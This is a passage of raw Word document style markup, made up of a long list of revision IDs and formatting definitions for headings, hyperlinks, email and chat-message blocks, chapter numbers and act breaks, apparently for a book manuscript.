    <w:rsid w:val="00B205DA"/>
    <w:rsid w:val="00B20B4E"/>
    <w:rsid w:val="00B22E4F"/>
    <w:rsid w:val="00B2385B"/>
    <w:rsid w:val="00B25F41"/>
    <w:rsid w:val="00B27A85"/>
    <w:rsid w:val="00B31DB6"/>
    <w:rsid w:val="00B353F8"/>
    <w:rsid w:val="00B3711D"/>
    <w:rsid w:val="00B401F8"/>
    <w:rsid w:val="00B41531"/>
    <w:rsid w:val="00B42F3F"/>
    <w:rsid w:val="00B44232"/>
    <w:rsid w:val="00B44BF8"/>
    <w:rsid w:val="00B45500"/>
    <w:rsid w:val="00B46997"/>
    <w:rsid w:val="00B47EA6"/>
    <w:rsid w:val="00B47F60"/>
    <w:rsid w:val="00B502A0"/>
    <w:rsid w:val="00B51998"/>
    <w:rsid w:val="00B53EAE"/>
    <w:rsid w:val="00B53F3D"/>
    <w:rsid w:val="00B55F95"/>
    <w:rsid w:val="00B57F42"/>
    <w:rsid w:val="00B634E1"/>
    <w:rsid w:val="00B63512"/>
    <w:rsid w:val="00B63946"/>
    <w:rsid w:val="00B662A4"/>
    <w:rsid w:val="00B6666F"/>
    <w:rsid w:val="00B66F7C"/>
    <w:rsid w:val="00B67446"/>
    <w:rsid w:val="00B71FD1"/>
    <w:rsid w:val="00B729EB"/>
    <w:rsid w:val="00B75003"/>
    <w:rsid w:val="00B75A3A"/>
    <w:rsid w:val="00B75F61"/>
    <w:rsid w:val="00B770FB"/>
    <w:rsid w:val="00B77F52"/>
    <w:rsid w:val="00B803A3"/>
    <w:rsid w:val="00B81A50"/>
    <w:rsid w:val="00B8272B"/>
    <w:rsid w:val="00B82965"/>
    <w:rsid w:val="00B8362A"/>
    <w:rsid w:val="00B840D7"/>
    <w:rsid w:val="00B856C8"/>
    <w:rsid w:val="00B87CE8"/>
    <w:rsid w:val="00B9126E"/>
    <w:rsid w:val="00B931B8"/>
    <w:rsid w:val="00B96B5E"/>
    <w:rsid w:val="00B977DB"/>
    <w:rsid w:val="00B97C0B"/>
    <w:rsid w:val="00BA1571"/>
    <w:rsid w:val="00BA2077"/>
    <w:rsid w:val="00BA2F2D"/>
    <w:rsid w:val="00BA32FB"/>
    <w:rsid w:val="00BA4315"/>
    <w:rsid w:val="00BA4A36"/>
    <w:rsid w:val="00BB0006"/>
    <w:rsid w:val="00BB085E"/>
    <w:rsid w:val="00BB47EF"/>
    <w:rsid w:val="00BB5079"/>
    <w:rsid w:val="00BB6052"/>
    <w:rsid w:val="00BB6AE4"/>
    <w:rsid w:val="00BB6CAD"/>
    <w:rsid w:val="00BB7030"/>
    <w:rsid w:val="00BC0194"/>
    <w:rsid w:val="00BC0F08"/>
    <w:rsid w:val="00BC1B2F"/>
    <w:rsid w:val="00BC2B8B"/>
    <w:rsid w:val="00BC5A74"/>
    <w:rsid w:val="00BC5C7D"/>
    <w:rsid w:val="00BC689E"/>
    <w:rsid w:val="00BC7F98"/>
    <w:rsid w:val="00BC7FC1"/>
    <w:rsid w:val="00BD1FFB"/>
    <w:rsid w:val="00BD21B6"/>
    <w:rsid w:val="00BD3F7F"/>
    <w:rsid w:val="00BD5F67"/>
    <w:rsid w:val="00BD6B5E"/>
    <w:rsid w:val="00BD75DE"/>
    <w:rsid w:val="00BE0E87"/>
    <w:rsid w:val="00BE13AB"/>
    <w:rsid w:val="00BE5233"/>
    <w:rsid w:val="00BE612C"/>
    <w:rsid w:val="00BE622F"/>
    <w:rsid w:val="00BE7429"/>
    <w:rsid w:val="00BF07AF"/>
    <w:rsid w:val="00BF1D9E"/>
    <w:rsid w:val="00BF501B"/>
    <w:rsid w:val="00BF5AF1"/>
    <w:rsid w:val="00BF72C4"/>
    <w:rsid w:val="00BF7936"/>
    <w:rsid w:val="00C00320"/>
    <w:rsid w:val="00C02149"/>
    <w:rsid w:val="00C039B7"/>
    <w:rsid w:val="00C05DE0"/>
    <w:rsid w:val="00C104BC"/>
    <w:rsid w:val="00C106BA"/>
    <w:rsid w:val="00C10D04"/>
    <w:rsid w:val="00C1280C"/>
    <w:rsid w:val="00C13649"/>
    <w:rsid w:val="00C13C44"/>
    <w:rsid w:val="00C14BFE"/>
    <w:rsid w:val="00C14C99"/>
    <w:rsid w:val="00C15C47"/>
    <w:rsid w:val="00C16573"/>
    <w:rsid w:val="00C17301"/>
    <w:rsid w:val="00C2033D"/>
    <w:rsid w:val="00C2085C"/>
    <w:rsid w:val="00C24776"/>
    <w:rsid w:val="00C24CC9"/>
    <w:rsid w:val="00C2674B"/>
    <w:rsid w:val="00C344F6"/>
    <w:rsid w:val="00C36D0F"/>
    <w:rsid w:val="00C37636"/>
    <w:rsid w:val="00C40210"/>
    <w:rsid w:val="00C41019"/>
    <w:rsid w:val="00C41CB6"/>
    <w:rsid w:val="00C41FF1"/>
    <w:rsid w:val="00C441DA"/>
    <w:rsid w:val="00C45047"/>
    <w:rsid w:val="00C5044D"/>
    <w:rsid w:val="00C548BA"/>
    <w:rsid w:val="00C54EE8"/>
    <w:rsid w:val="00C5541E"/>
    <w:rsid w:val="00C55984"/>
    <w:rsid w:val="00C6396D"/>
    <w:rsid w:val="00C657E2"/>
    <w:rsid w:val="00C65FCA"/>
    <w:rsid w:val="00C703B8"/>
    <w:rsid w:val="00C734CE"/>
    <w:rsid w:val="00C74F41"/>
    <w:rsid w:val="00C77688"/>
    <w:rsid w:val="00C778FF"/>
    <w:rsid w:val="00C77BB8"/>
    <w:rsid w:val="00C80641"/>
    <w:rsid w:val="00C81367"/>
    <w:rsid w:val="00C824A8"/>
    <w:rsid w:val="00C82560"/>
    <w:rsid w:val="00C82F68"/>
    <w:rsid w:val="00C84770"/>
    <w:rsid w:val="00C870FE"/>
    <w:rsid w:val="00C877F1"/>
    <w:rsid w:val="00C87988"/>
    <w:rsid w:val="00C904C8"/>
    <w:rsid w:val="00C911D3"/>
    <w:rsid w:val="00C917BE"/>
    <w:rsid w:val="00C92641"/>
    <w:rsid w:val="00C9369D"/>
    <w:rsid w:val="00C94B49"/>
    <w:rsid w:val="00C95D78"/>
    <w:rsid w:val="00CA1257"/>
    <w:rsid w:val="00CA250D"/>
    <w:rsid w:val="00CA2BDD"/>
    <w:rsid w:val="00CA2E09"/>
    <w:rsid w:val="00CA69EB"/>
    <w:rsid w:val="00CB1290"/>
    <w:rsid w:val="00CB1B8B"/>
    <w:rsid w:val="00CB2268"/>
    <w:rsid w:val="00CB44E7"/>
    <w:rsid w:val="00CB56FA"/>
    <w:rsid w:val="00CB667B"/>
    <w:rsid w:val="00CC1858"/>
    <w:rsid w:val="00CC286E"/>
    <w:rsid w:val="00CC4CDB"/>
    <w:rsid w:val="00CC5A39"/>
    <w:rsid w:val="00CC6DCE"/>
    <w:rsid w:val="00CD31E2"/>
    <w:rsid w:val="00CD3528"/>
    <w:rsid w:val="00CD42FA"/>
    <w:rsid w:val="00CD4700"/>
    <w:rsid w:val="00CD5033"/>
    <w:rsid w:val="00CD5CFF"/>
    <w:rsid w:val="00CD62B7"/>
    <w:rsid w:val="00CD682B"/>
    <w:rsid w:val="00CD686C"/>
    <w:rsid w:val="00CE07B3"/>
    <w:rsid w:val="00CE10D8"/>
    <w:rsid w:val="00CE274B"/>
    <w:rsid w:val="00CE27EF"/>
    <w:rsid w:val="00CE31A4"/>
    <w:rsid w:val="00CE43FE"/>
    <w:rsid w:val="00CE65D0"/>
    <w:rsid w:val="00CE740F"/>
    <w:rsid w:val="00CF0065"/>
    <w:rsid w:val="00CF25F5"/>
    <w:rsid w:val="00CF4874"/>
    <w:rsid w:val="00CF4AB3"/>
    <w:rsid w:val="00CF5804"/>
    <w:rsid w:val="00D000E7"/>
    <w:rsid w:val="00D0104D"/>
    <w:rsid w:val="00D01C59"/>
    <w:rsid w:val="00D023D3"/>
    <w:rsid w:val="00D04470"/>
    <w:rsid w:val="00D044C2"/>
    <w:rsid w:val="00D04690"/>
    <w:rsid w:val="00D05038"/>
    <w:rsid w:val="00D0562D"/>
    <w:rsid w:val="00D05DF7"/>
    <w:rsid w:val="00D07688"/>
    <w:rsid w:val="00D10095"/>
    <w:rsid w:val="00D100CE"/>
    <w:rsid w:val="00D10570"/>
    <w:rsid w:val="00D11467"/>
    <w:rsid w:val="00D11F82"/>
    <w:rsid w:val="00D15E40"/>
    <w:rsid w:val="00D174C0"/>
    <w:rsid w:val="00D200FC"/>
    <w:rsid w:val="00D211EB"/>
    <w:rsid w:val="00D21269"/>
    <w:rsid w:val="00D21B76"/>
    <w:rsid w:val="00D21D86"/>
    <w:rsid w:val="00D22895"/>
    <w:rsid w:val="00D22E7F"/>
    <w:rsid w:val="00D2468A"/>
    <w:rsid w:val="00D26BEE"/>
    <w:rsid w:val="00D31482"/>
    <w:rsid w:val="00D320EE"/>
    <w:rsid w:val="00D345C0"/>
    <w:rsid w:val="00D34EA9"/>
    <w:rsid w:val="00D35F00"/>
    <w:rsid w:val="00D363B1"/>
    <w:rsid w:val="00D36751"/>
    <w:rsid w:val="00D3712D"/>
    <w:rsid w:val="00D4155B"/>
    <w:rsid w:val="00D41BB6"/>
    <w:rsid w:val="00D41FAA"/>
    <w:rsid w:val="00D43647"/>
    <w:rsid w:val="00D43C44"/>
    <w:rsid w:val="00D45418"/>
    <w:rsid w:val="00D46C67"/>
    <w:rsid w:val="00D47E2B"/>
    <w:rsid w:val="00D47E5D"/>
    <w:rsid w:val="00D511D4"/>
    <w:rsid w:val="00D5582B"/>
    <w:rsid w:val="00D56B38"/>
    <w:rsid w:val="00D57F54"/>
    <w:rsid w:val="00D601EE"/>
    <w:rsid w:val="00D60E05"/>
    <w:rsid w:val="00D64D27"/>
    <w:rsid w:val="00D65635"/>
    <w:rsid w:val="00D667D7"/>
    <w:rsid w:val="00D752B0"/>
    <w:rsid w:val="00D76158"/>
    <w:rsid w:val="00D766C9"/>
    <w:rsid w:val="00D80FDE"/>
    <w:rsid w:val="00D83259"/>
    <w:rsid w:val="00D8459E"/>
    <w:rsid w:val="00D84AA6"/>
    <w:rsid w:val="00D855C1"/>
    <w:rsid w:val="00D92190"/>
    <w:rsid w:val="00D92CA6"/>
    <w:rsid w:val="00D94499"/>
    <w:rsid w:val="00D95E38"/>
    <w:rsid w:val="00D97C86"/>
    <w:rsid w:val="00DA03A5"/>
    <w:rsid w:val="00DA0ADF"/>
    <w:rsid w:val="00DA3B75"/>
    <w:rsid w:val="00DA506D"/>
    <w:rsid w:val="00DA52B2"/>
    <w:rsid w:val="00DA7B6F"/>
    <w:rsid w:val="00DB1083"/>
    <w:rsid w:val="00DB1E90"/>
    <w:rsid w:val="00DB240F"/>
    <w:rsid w:val="00DB52D1"/>
    <w:rsid w:val="00DB563B"/>
    <w:rsid w:val="00DB6014"/>
    <w:rsid w:val="00DB642D"/>
    <w:rsid w:val="00DB7470"/>
    <w:rsid w:val="00DB76F8"/>
    <w:rsid w:val="00DC0EC4"/>
    <w:rsid w:val="00DC11C4"/>
    <w:rsid w:val="00DC152C"/>
    <w:rsid w:val="00DC3E9D"/>
    <w:rsid w:val="00DC69E1"/>
    <w:rsid w:val="00DC6B3B"/>
    <w:rsid w:val="00DC6C27"/>
    <w:rsid w:val="00DD1248"/>
    <w:rsid w:val="00DD19D1"/>
    <w:rsid w:val="00DD22A0"/>
    <w:rsid w:val="00DD4DF5"/>
    <w:rsid w:val="00DE1B72"/>
    <w:rsid w:val="00DE4014"/>
    <w:rsid w:val="00DE5C21"/>
    <w:rsid w:val="00DF05EC"/>
    <w:rsid w:val="00DF098A"/>
    <w:rsid w:val="00DF0BDA"/>
    <w:rsid w:val="00DF1247"/>
    <w:rsid w:val="00DF1AF8"/>
    <w:rsid w:val="00DF5875"/>
    <w:rsid w:val="00DF686F"/>
    <w:rsid w:val="00DF7E41"/>
    <w:rsid w:val="00E008FD"/>
    <w:rsid w:val="00E00924"/>
    <w:rsid w:val="00E010F3"/>
    <w:rsid w:val="00E0150B"/>
    <w:rsid w:val="00E015B3"/>
    <w:rsid w:val="00E01B84"/>
    <w:rsid w:val="00E03C30"/>
    <w:rsid w:val="00E04693"/>
    <w:rsid w:val="00E04845"/>
    <w:rsid w:val="00E0637D"/>
    <w:rsid w:val="00E07FFB"/>
    <w:rsid w:val="00E10DF0"/>
    <w:rsid w:val="00E10DF9"/>
    <w:rsid w:val="00E11B9F"/>
    <w:rsid w:val="00E120F2"/>
    <w:rsid w:val="00E122E7"/>
    <w:rsid w:val="00E145D1"/>
    <w:rsid w:val="00E15D7E"/>
    <w:rsid w:val="00E168FF"/>
    <w:rsid w:val="00E16C28"/>
    <w:rsid w:val="00E22567"/>
    <w:rsid w:val="00E23AD4"/>
    <w:rsid w:val="00E24451"/>
    <w:rsid w:val="00E249D4"/>
    <w:rsid w:val="00E25063"/>
    <w:rsid w:val="00E254B0"/>
    <w:rsid w:val="00E325B7"/>
    <w:rsid w:val="00E34148"/>
    <w:rsid w:val="00E368D5"/>
    <w:rsid w:val="00E37456"/>
    <w:rsid w:val="00E377E1"/>
    <w:rsid w:val="00E3794C"/>
    <w:rsid w:val="00E403A9"/>
    <w:rsid w:val="00E416DE"/>
    <w:rsid w:val="00E419B9"/>
    <w:rsid w:val="00E4232A"/>
    <w:rsid w:val="00E44754"/>
    <w:rsid w:val="00E449D1"/>
    <w:rsid w:val="00E45921"/>
    <w:rsid w:val="00E46477"/>
    <w:rsid w:val="00E47BE8"/>
    <w:rsid w:val="00E513AE"/>
    <w:rsid w:val="00E52D1A"/>
    <w:rsid w:val="00E55257"/>
    <w:rsid w:val="00E55D7C"/>
    <w:rsid w:val="00E56344"/>
    <w:rsid w:val="00E563F7"/>
    <w:rsid w:val="00E56831"/>
    <w:rsid w:val="00E56DEA"/>
    <w:rsid w:val="00E56E0B"/>
    <w:rsid w:val="00E6261D"/>
    <w:rsid w:val="00E627C7"/>
    <w:rsid w:val="00E62D8D"/>
    <w:rsid w:val="00E67EBB"/>
    <w:rsid w:val="00E71034"/>
    <w:rsid w:val="00E7243D"/>
    <w:rsid w:val="00E74D52"/>
    <w:rsid w:val="00E74ED9"/>
    <w:rsid w:val="00E76D3B"/>
    <w:rsid w:val="00E77172"/>
    <w:rsid w:val="00E77582"/>
    <w:rsid w:val="00E824B2"/>
    <w:rsid w:val="00E838D1"/>
    <w:rsid w:val="00E85823"/>
    <w:rsid w:val="00E85CD5"/>
    <w:rsid w:val="00E8604A"/>
    <w:rsid w:val="00E86BF6"/>
    <w:rsid w:val="00E87E52"/>
    <w:rsid w:val="00E920D2"/>
    <w:rsid w:val="00E929EA"/>
    <w:rsid w:val="00E92C1F"/>
    <w:rsid w:val="00E93B61"/>
    <w:rsid w:val="00EA4C6C"/>
    <w:rsid w:val="00EA4F79"/>
    <w:rsid w:val="00EA7F68"/>
    <w:rsid w:val="00EB4CF1"/>
    <w:rsid w:val="00EC0242"/>
    <w:rsid w:val="00EC0D5B"/>
    <w:rsid w:val="00EC184B"/>
    <w:rsid w:val="00EC2090"/>
    <w:rsid w:val="00EC2D8F"/>
    <w:rsid w:val="00EC358E"/>
    <w:rsid w:val="00EC4362"/>
    <w:rsid w:val="00EC500F"/>
    <w:rsid w:val="00EC79FD"/>
    <w:rsid w:val="00ED0823"/>
    <w:rsid w:val="00ED0A31"/>
    <w:rsid w:val="00ED0F12"/>
    <w:rsid w:val="00ED306B"/>
    <w:rsid w:val="00EE011E"/>
    <w:rsid w:val="00EE0BB3"/>
    <w:rsid w:val="00EE1BA0"/>
    <w:rsid w:val="00EE4534"/>
    <w:rsid w:val="00EE5013"/>
    <w:rsid w:val="00EE51A0"/>
    <w:rsid w:val="00EE6528"/>
    <w:rsid w:val="00EE78BA"/>
    <w:rsid w:val="00EF1133"/>
    <w:rsid w:val="00EF1CCA"/>
    <w:rsid w:val="00EF25FC"/>
    <w:rsid w:val="00EF2605"/>
    <w:rsid w:val="00EF3BB7"/>
    <w:rsid w:val="00F01046"/>
    <w:rsid w:val="00F01CAB"/>
    <w:rsid w:val="00F0694A"/>
    <w:rsid w:val="00F07C10"/>
    <w:rsid w:val="00F1032D"/>
    <w:rsid w:val="00F10AFC"/>
    <w:rsid w:val="00F13149"/>
    <w:rsid w:val="00F141E0"/>
    <w:rsid w:val="00F14C1A"/>
    <w:rsid w:val="00F16EBC"/>
    <w:rsid w:val="00F21560"/>
    <w:rsid w:val="00F21D2A"/>
    <w:rsid w:val="00F226A8"/>
    <w:rsid w:val="00F227AD"/>
    <w:rsid w:val="00F22C1B"/>
    <w:rsid w:val="00F23EA1"/>
    <w:rsid w:val="00F25187"/>
    <w:rsid w:val="00F25966"/>
    <w:rsid w:val="00F3063B"/>
    <w:rsid w:val="00F32F2D"/>
    <w:rsid w:val="00F350F1"/>
    <w:rsid w:val="00F36A77"/>
    <w:rsid w:val="00F372C6"/>
    <w:rsid w:val="00F37905"/>
    <w:rsid w:val="00F4029E"/>
    <w:rsid w:val="00F40546"/>
    <w:rsid w:val="00F4353B"/>
    <w:rsid w:val="00F43A7E"/>
    <w:rsid w:val="00F44842"/>
    <w:rsid w:val="00F4490E"/>
    <w:rsid w:val="00F44DE6"/>
    <w:rsid w:val="00F4506A"/>
    <w:rsid w:val="00F47C01"/>
    <w:rsid w:val="00F5129C"/>
    <w:rsid w:val="00F51325"/>
    <w:rsid w:val="00F531FB"/>
    <w:rsid w:val="00F543B2"/>
    <w:rsid w:val="00F55E81"/>
    <w:rsid w:val="00F572FC"/>
    <w:rsid w:val="00F57D80"/>
    <w:rsid w:val="00F60049"/>
    <w:rsid w:val="00F610F2"/>
    <w:rsid w:val="00F618F5"/>
    <w:rsid w:val="00F625D4"/>
    <w:rsid w:val="00F62BCE"/>
    <w:rsid w:val="00F63323"/>
    <w:rsid w:val="00F65EB7"/>
    <w:rsid w:val="00F66EA7"/>
    <w:rsid w:val="00F66F88"/>
    <w:rsid w:val="00F71E53"/>
    <w:rsid w:val="00F73C21"/>
    <w:rsid w:val="00F76D35"/>
    <w:rsid w:val="00F77652"/>
    <w:rsid w:val="00F7769E"/>
    <w:rsid w:val="00F83CFD"/>
    <w:rsid w:val="00F84AF6"/>
    <w:rsid w:val="00F84F19"/>
    <w:rsid w:val="00F8570E"/>
    <w:rsid w:val="00F86333"/>
    <w:rsid w:val="00F86366"/>
    <w:rsid w:val="00F90A83"/>
    <w:rsid w:val="00F91086"/>
    <w:rsid w:val="00F91345"/>
    <w:rsid w:val="00F9243B"/>
    <w:rsid w:val="00F9293A"/>
    <w:rsid w:val="00F95985"/>
    <w:rsid w:val="00F96840"/>
    <w:rsid w:val="00F97048"/>
    <w:rsid w:val="00F97D6C"/>
    <w:rsid w:val="00FA02A6"/>
    <w:rsid w:val="00FA1561"/>
    <w:rsid w:val="00FA2256"/>
    <w:rsid w:val="00FA4976"/>
    <w:rsid w:val="00FA69A5"/>
    <w:rsid w:val="00FB00AB"/>
    <w:rsid w:val="00FB0DB7"/>
    <w:rsid w:val="00FB0E11"/>
    <w:rsid w:val="00FB1B56"/>
    <w:rsid w:val="00FB2E60"/>
    <w:rsid w:val="00FB304F"/>
    <w:rsid w:val="00FB3358"/>
    <w:rsid w:val="00FB45A8"/>
    <w:rsid w:val="00FB6007"/>
    <w:rsid w:val="00FB795D"/>
    <w:rsid w:val="00FC06D2"/>
    <w:rsid w:val="00FC482F"/>
    <w:rsid w:val="00FC4CCA"/>
    <w:rsid w:val="00FC4EAE"/>
    <w:rsid w:val="00FC6966"/>
    <w:rsid w:val="00FC7506"/>
    <w:rsid w:val="00FC7D8D"/>
    <w:rsid w:val="00FD02CF"/>
    <w:rsid w:val="00FD15C1"/>
    <w:rsid w:val="00FD3E6F"/>
    <w:rsid w:val="00FD4E2A"/>
    <w:rsid w:val="00FD4F86"/>
    <w:rsid w:val="00FD5A35"/>
    <w:rsid w:val="00FD62A6"/>
    <w:rsid w:val="00FD63DB"/>
    <w:rsid w:val="00FE0006"/>
    <w:rsid w:val="00FE414D"/>
    <w:rsid w:val="00FE6474"/>
    <w:rsid w:val="00FE67BA"/>
    <w:rsid w:val="00FE789E"/>
    <w:rsid w:val="00FF1240"/>
    <w:rsid w:val="00FF24F0"/>
    <w:rsid w:val="00FF3F4F"/>
    <w:rsid w:val="00FF53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3C6"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading3">
    <w:name w:val="heading 3"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="Heading3Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="000D34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3488"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="27"/>
      <w:szCs w:val="27"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="msonormal0">
    <w:name w:val="msonormal"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="000D34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3488"/>
    <w:rPr>
      <w:color w:val="0000FF"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="FollowedHyperlink">
    <w:name w:val="FollowedHyperlink"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="000D3488"/>
    <w:rPr>
      <w:color w:val="800080"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NormalWeb">
    <w:name w:val="Normal (Web)"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="000D34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lead">
    <w:name w:val="caplead"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="000D3488"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="apple-converted-space">
    <w:name w:val="apple-converted-space"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="000D3488"/>
  </w:style>
  <w:style w:type="character" w:styleId="Emphasis">
    <w:name w:val="Emphasis"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="20"/>
    <w:qFormat/>
    <w:rsid w:val="000D3488"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="computer">
    <w:name w:val="computer"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="000D3488"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="think">
    <w:name w:val="think"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="000D3488"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="HTMLPreformatted">
    <w:name w:val="HTML Preformatted"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HTMLPreformattedChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="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3488"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Strong">
    <w:name w:val="Strong"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="22"/>
    <w:qFormat/>
    <w:rsid w:val="000D3488"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Email">
    <w:name w:val="Email"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="EmailChar"/>
    <w:qFormat/>
    <w:rsid w:val="00C824A8"/>
    <w:pPr>
      <w:spacing w:before="360" w:after="360" w:line="300" w:lineRule="atLeast"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:color w:val="004400"/>
      <w:sz w:val="21"/>
      <w:szCs w:val="21"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="MsgRecv">
    <w:name w:val="MsgRecv"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="MsgRecvChar"/>
    <w:qFormat/>
    <w:rsid w:val="00241C34"/>
    <w:pPr>
      <w:pBdr>
        <w:top w:val="single" w:sz="4" w:space="1" w:color="C5E0B3" w:themeColor="accent6" w:themeTint="66"/>
        <w:left w:val="single" w:sz="4" w:space="4" w:color="C5E0B3" w:themeColor="accent6" w:themeTint="66"/>
        <w:bottom w:val="single" w:sz="4" w:space="1" w:color="C5E0B3" w:themeColor="accent6" w:themeTint="66"/>
        <w:right w:val="single" w:sz="4" w:space="4" w:color="C5E0B3" w:themeColor="accent6" w:themeTint="66"/>
      </w:pBdr>
      <w:shd w:val="clear" w:color="auto" w:fill="E2EFD9" w:themeFill="accent6" w:themeFillTint="33"/>
      <w:spacing w:line="300" w:lineRule="atLeast"/>
      <w:ind w:right="2880"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:color w:val="004400"/>
      <w:sz w:val="21"/>
      <w:szCs w:val="21"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="EmailChar">
    <w:name w:val="Email Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Email"/>
    <w:rsid w:val="00C824A8"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:color w:val="004400"/>
      <w:sz w:val="21"/>
      <w:szCs w:val="21"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="MsgSend">
    <w:name w:val="MsgSend"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="MsgSendChar"/>
    <w:qFormat/>
    <w:rsid w:val="00241C34"/>
    <w:pPr>
      <w:pBdr>
        <w:top w:val="single" w:sz="4" w:space="1" w:color="C5E0B3" w:themeColor="accent6" w:themeTint="66"/>
        <w:left w:val="single" w:sz="4" w:space="4" w:color="C5E0B3" w:themeColor="accent6" w:themeTint="66"/>
        <w:bottom w:val="single" w:sz="4" w:space="1" w:color="C5E0B3" w:themeColor="accent6" w:themeTint="66"/>
        <w:right w:val="single" w:sz="4" w:space="4" w:color="C5E0B3" w:themeColor="accent6" w:themeTint="66"/>
      </w:pBdr>
      <w:shd w:val="clear" w:color="auto" w:fill="E2EFD9" w:themeFill="accent6" w:themeFillTint="33"/>
      <w:spacing w:line="300" w:lineRule="atLeast"/>
      <w:ind w:left="2880"/>
      <w:jc w:val="right"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:color w:val="004400"/>
      <w:sz w:val="21"/>
      <w:szCs w:val="21"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="MsgRecvChar">
    <w:name w:val="MsgRecv Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="MsgRecv"/>
    <w:rsid w:val="00241C34"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:color w:val="004400"/>
      <w:sz w:val="21"/>
      <w:szCs w:val="21"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E2EFD9" w:themeFill="accent6" w:themeFillTint="33"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="ChapterNum">
    <w:name w:val="ChapterNum"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="ChapterNumChar"/>
    <w:qFormat/>
    <w:rsid w:val="00BE7429"/>
    <w:pPr>
      <w:pageBreakBefore/>
      <w:spacing w:before="480" w:after="1440" w:line="420" w:lineRule="atLeast"/>
      <w:jc w:val="right"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
      <w:color w:val="000000"/>
      <w:sz w:val="75"/>
      <w:szCs w:val="75"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="MsgSendChar">
    <w:name w:val="MsgSend Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="MsgSend"/>
    <w:rsid w:val="00241C34"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:color w:val="004400"/>
      <w:sz w:val="21"/>
      <w:szCs w:val="21"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E2EFD9" w:themeFill="accent6" w:themeFillTint="33"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="ActBreak">
    <w:name w:val="ActBreak"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="ActBreakChar"/>
    <w:qFormat/>
    <w:rsid w:val="00B45500"/>
    <w:pPr>
      <w:pageBreakBefore/>
      <w:spacing w:before="1200" w:after="1440" w:line="420" w:lineRule="atLeast"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
      <w:color w:val="000000"/>
      <w:sz w:val="120"/>
      <w:szCs w:val="120"/>
